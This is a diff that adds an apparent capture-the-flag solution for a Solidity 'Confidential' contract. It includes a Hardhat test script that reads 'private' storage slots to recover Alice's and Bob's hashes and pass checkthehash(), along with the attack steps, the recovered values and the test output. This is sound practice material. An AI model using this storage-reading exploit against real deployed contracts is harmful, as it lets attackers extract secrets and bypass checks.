@@ -1,0 +1,63 @@
+Test Script to exploit the contract:
+
+const { expect } = require("chai");
+
+describe("Exploit Confidential Contract", function () {
+  before(async () => {
+    // deploying the target contract
+    const Confidential = await ethers.getContractFactory("Confidential");
+    target = await Confidential.deploy();
+  })
+  it("Find the confidential hashes and call the checkthehash() function", async () => {
+
+    try {
+      // Step 1: Get the stored data at slot 4 (alice's private hash) of memory using ethers
+      const aliceHash = await ethers.provider.getStorageAt(target.address, 4);
+      console.log("Alice's confidential hash: ", aliceHash);
+      // Step 2: Get the stored data at slot 9 (bob's private hash) of memory using ethers
+      const bobHash = await ethers.provider.getStorageAt(target.address, 9);
+      console.log("Bob's confidential hash: ", bobHash);
+      // Step 3: Call the hash() function to find the keccak256 hash of aliceHash and bobHash
+      const combinedHash = await target.hash(aliceHash, bobHash);
+      // Step 4: Call the checkthehash() function to check if we have the right hash
+      const output = await target.checkthehash(combinedHash);
+      // test to make sure we got true from checkthehash() function
+      console.log("checkthehash() output: ", output);
+      // Test
+      expect(output).to.equal(true)
+    } catch (err) {
+      console.log(err);
+    }
+
+  })
+});
+
+Vulnerability:
+The private variables are not actually private in the contract. They can be accessed by certain tools like ethers, slither, etc.
+
+Objective:
+Find the keccak256 hash of aliceHash and bobHash. 
+
+Attack steps:
+1. Get the stored data at slot 4 (alice's private hash) of memory using ethers. Alice's hash: 0x9371c02eefbd06113fb7e1ce6d27c3c7f6c8fc4d1b5f5f6b2620cd04d1610e3f
+
+2. Get the stored data at slot 9 (bob's private hash) of memory using ethers. Bob's hash: 0x23884ae3f28ba61fa99f4875e67f11b7c95e1f490cdf5f362c088e4ffaba0855
+
+3.  Call the hash() function to find the keccak256 hash of alice and bob.
+
+4. Call the checkthehash() function to check if the hash is right.
+
+
+
+Test case output:
+❯ npx hardhat test
+
+
+  Exploit Confidential Contract
+Alice's confidential hash:  0x9371c02eefbd06113fb7e1ce6d27c3c7f6c8fc4d1b5f5f6b2620cd04d1610e3f
+Bob's confidential hash:  0x23884ae3f28ba61fa99f4875e67f11b7c95e1f490cdf5f362c088e4ffaba0855
+checkthehash() output:  true
+    ✔ Find the confidential hashes and call the checkthehash() function
+
+
+  1 passing (700ms)
